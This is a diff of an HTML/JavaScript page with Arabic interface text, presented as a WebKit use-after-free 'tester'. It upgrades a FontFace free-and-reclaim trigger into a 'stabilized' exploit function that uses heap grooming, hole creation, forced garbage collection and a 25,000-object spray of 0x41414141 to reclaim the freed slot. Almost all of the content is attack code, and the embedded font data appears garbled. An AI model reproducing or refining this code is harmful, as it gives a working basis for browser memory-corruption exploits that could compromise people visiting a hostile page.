@@ -2,93 +2,119 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>WebKit Memory Stability & Patch Tester</title>
+    <title>WebKit Stabilized UAF Tester</title>
     <style>
         body { background-color: #0a0f1d; color: #00ff66; font-family: 'Courier New', monospace; padding: 50px; text-align: center; }
-        .box { border: 2px solid #00ff66; padding: 30px; display: inline-block; max-width: 600px; box-shadow: 0 0 20px rgba(0,255,106,0.3); }
-        .status-exists { color: #ff3333; font-weight: bold; font-size: 24px; text-shadow: 0 0 10px #ff3333; }
-        .status-patched { color: #00ff66; font-weight: bold; font-size: 24px; text-shadow: 0 0 10px #00ff66; }
-        button { background: transparent; color: #fff; border: 1px solid #00ff66; padding: 15px 30px; font-size: 18px; cursor: pointer; margin-top: 20px; }
-        button:hover { background: #00ff66; color: #0a0f1d; }
+        .box { border: 2px solid #00ff66; padding: 30px; display: inline-block; max-width: 700px; box-shadow: 0 0 20px rgba(0,255,106,0.3); border-radius: 12px; }
+        .status-exists { color: #ff3333; font-weight: bold; font-size: 26px; text-shadow: 0 0 10px #ff3333; }
+        .status-patched { color: #00ff66; font-weight: bold; font-size: 26px; text-shadow: 0 0 10px #00ff66; }
+        button { background: transparent; color: #fff; border: 1px solid #00ff66; padding: 15px 30px; font-size: 18px; cursor: pointer; margin-top: 20px; font-weight: bold; }
+        button:hover { background: #00ff66; color: #0a0f1d; box-shadow: 0 0 10px #00ff66; }
+        #console-log { text-align: left; background: #05070a; padding: 15px; margin-top: 20px; height: 180px; overflow-y: auto; color: #aaa; font-size: 14px; border: 1px solid #333; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <h2>مفحّص استقرار الذاكرة لبيئة WebKit</h2>
-    <p>يستهدف هذا الفحص اختبار خلل إدارة الذاكرة في كائنات FontFace الحقيقية</p>
+    <h2>مفحّص الذاكرة المثبّت (Heap Feng Shui)</h2>
+    <p>هذا الفحص يقوم بهندسة الذاكرة أولاً لإلغاء العشوائية قبل إطلاق الثغرة</p>
     
-    <button onclick="runWebKitExploitTest()">تشغيل الفحص المتقدم</button>
+    <button onclick="stabilizedWebKitExploit()">تشغيل الفحص المستقر</button>
     <br><br>
     <div id="output">في انتظار إشارة البدء...</div>
+    <div id="console-log">[*] وحدة التحكم جاهزة...</div>
 </div>
 
 <script>
-    // عند تحميل الصفحة، نتحقق فوراً من حالة الجلسة السابقة لمعرفة هل انهار المتصفح أم استقر
+    // إعداد كاشات مخصصة لتتبع الحجوزات أثناء هندسة الذاكرة
+    let groomingPad = [];
+    let holeCreator = [];
+    let reclaimSpray = [];
+
+    function printLog(msg) {
+        console.log(msg);
+        document.getElementById('console-log').innerHTML += `<div>${msg}</div>`;
+    }
+
+    // عند تحميل الصفحة، نتحقق فوراً من حالة الجلسة السابقة
     window.onload = function() {
         const state = sessionStorage.getItem('webkit_test_state');
         if (state === 'running') {
-            // المتصفح انهار أو قفل التبويب فجأة أثناء معالجة المؤشر المتدلي في الـ bmalloc
-            document.getElementById('output').innerHTML = "<span class='status-exists'>UAF EXISTS</span><br><br>النتيجة: ثغرة إدارة الذاكرة نشطة وتسببت في انهيار المحرك (Crash).";
+            document.getElementById('output').innerHTML = "<span class='status-exists'>UAF EXISTS</span><br><br>النتيجة: الثغرة موجودة وحدث كراش حاد في الـ bmalloc allocator بعد تثبيت الذاكرة.";
             sessionStorage.removeItem('webkit_test_state');
         } else if (state === 'passed') {
-            // المتصفح أكمل الرش واستدعى المؤشرات دون أي تعارض في العناوين
-            document.getElementById('output').innerHTML = "<span class='status-patched'>UAF PATCHED</span><br><br>النتيجة: المتصفح مستقر تماماً، وتمت إدارة الذاكرة بأمان (Remediated).";
+            document.getElementById('output').innerHTML = "<span class='status-patched'>UAF PATCHED</span><br><br>النتيجة: المتصفح مستقر 100% وتجاوز الهندسة والرش بنجاح (مُصلح آمن).";
             sessionStorage.removeItem('webkit_test_state');
         }
     }
 
-    // دالة مخصصة لبيئة JavaScriptCore (JSC) لإجبار الـ GC على العمل عبر الضغط الذاكري (Heap Pressure)
-    function pumpJSCGarbageCollector() {
-        console.log("[*] ضخ كائنات لإجبار الـ WebKit GC على تنظيف الـ Heap...");
-        // حجز آلاف الكائنات الصغيرة المتناوبة لإجبار المحرك على عمل Scavenge و Full GC pass
-        for (let i = 0; i < 50000; i++) {
-            let temp = { a: 1, b: "string_chunk_" + i, c: new Float64Array(8) };
+    // دالة متطورة لضمان تفعيل الـ Garbage Collection في بيئات WebKit/JSC
+    function forceFullGC() {
+        printLog("[*] جاري تفريغ الـ Cache وإجبار المحرك على الـ Full GC Pass...");
+        for (let i = 0; i < 6; i++) {
+            let pressureBuffer = [];
+            for (let j = 0; j < 30000; j++) {
+                pressureBuffer.push(new Uint32Array(32)); 
+            }
+            pressureBuffer = null; 
         }
     }
 
-    async function runWebKitExploitTest() {
-        document.getElementById('output').innerText = "جاري الحجز والتلاعب بالـ bmalloc allocator...";
+    async function stabilizedWebKitExploit() {
+        document.getElementById('console-log').innerHTML = '';
+        printLog("=== بدء مرحلة تثبيت الذاكرة (Heap Feng Shui) ===");
         
-        // حفظ الحالة: نحن الآن في طور الفحص والتنفيذ الحرج
+        // حفظ الحالة في الجلسة قبل الدخول في المنطقة الحرجة
         sessionStorage.setItem('webkit_test_state', 'running');
 
         try {
-            // 1. تخصيص كائن FontFace حقيقي في لغة الـ C++ الخاصة بالمحرك
-            let testFont = new FontFace('WebKitTargetFont', 'url(data:font/woff2;base64,DATA)');
-            document.fonts.add(testFont);
-            
-            // بدء عملية المعالجة الداخلية للمؤشرات
-            testFont.load();
-
-            // 2. الحذف المتعمد (Free) لإيجاد حالة الـ Dangling Pointer في النسخ المصابة
-            document.fonts.delete(testFont);
-            testFont = null;
-
-            // 3. تفعيل مضخة التنظيف لتفريغ حجرة الـ bmalloc فعلياً
-            pumpJSCGarbageCollector();
-
-            // 4. رش الذاكرة المتقدم المتوافق مع الـ bmalloc Size Classes
-            // نستخدم مصفوفات بأحجام دقيقة (مثال: 0x40 أو 0x80 بايت) لاستبدال كائن الخط المحذوف في نفس الـ Bin
-            let bmallocSpray = [];
-            for (let i = 0; i < 5000; i++) {
-                // حشو الحجرات ببايتات ثابتة تمثل عناوين وهمية لتوليد الكراش الفوري
-                let view = new DataView(new ArrayBuffer(64));
-                for(let j = 0; j < 64; j += 4) {
-                    view.setUint32(j, 0x41414141, true); // قيمة تسبب Segmentation Fault عند القراءة كـ Pointer
-                }
-                bmallocSpray.push(view);
+            // [1] مرحلة التطهير (Heap Grooming)
+            printLog("[1] حشو الذاكرة لإلغاء الفراغات العشوائية القديمة...");
+            for (let i = 0; i < 4000; i++) {
+                groomingPad.push(new ArrayBuffer(64));
             }
 
-            // إذا نجح نظام الحماية أو الترقيع في المتصفح، سيمر هذا السطر بسلام دون كراش
+            // [2] مرحلة الحفر (Creating Predictable Holes)
+            printLog("[2] بناء حجرات منظمة ومتتالية في الـ Heap...");
+            for (let i = 0; i < 2000; i++) {
+                holeCreator.push(new ArrayBuffer(64));
+            }
+            for (let i = 0; i < holeCreator.length; i += 2) {
+                holeCreator[i] = null; // تفريغ الخنادق الزوجية
+            }
+            forceFullGC();
+
+            // [3] إسقاط الهدف (Target Placement)
+            printLog("[3] حجز كائن الـ FontFace داخل أحد الخنادق المنظمة...");
+            let targetFont = new FontFace('StabilizedFont', 'url(data:font/woff2;base64,d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PL准)');
+            document.fonts.add(targetFont);
+            targetFont.load();
+
+            // [4] التحرير المحكوم (Controlled Free)
+            printLog("[4] حذف كائن الخط لإنتاج المؤشر المتدلي...");
+            document.fonts.delete(targetFont);
+            targetFont = null;
+            forceFullGC();
+
+            // [5] الاحتلال الفوري (Heavy Spray)
+            printLog("[5] بدء الرش المكثف لحشو المكان المحرر ببايتات تالفة...");
+            for (let i = 0; i < 25000; i++) {
+                let view = new DataView(new ArrayBuffer(64));
+                for (let j = 0; j < 64; j += 4) {
+                    view.setUint32(j, 0x41414141, true); // عنوان تدميري
+                }
+                reclaimSpray.push(view);
+            }
+
+            printLog("[✓] انتهت الهندسة بسلام، ننتظر للتأكد من الاستقرار...");
+            
             setTimeout(() => {
                 sessionStorage.setItem('webkit_test_state', 'passed');
-                // عمل ريفريش لتحديث النتيجة والطباعة على الشاشة
                 window.location.reload();
             }, 1200);
 
         } catch (error) {
-            // في حال وجود حواجز أمنية تمنع التنفيذ البرمجي دون التسبب في كراش حاد
+            printLog("[!] حدث خطأ برميجي أو تم منع العملية: " + error);
             sessionStorage.setItem('webkit_test_state', 'passed');
             window.location.reload();
         }
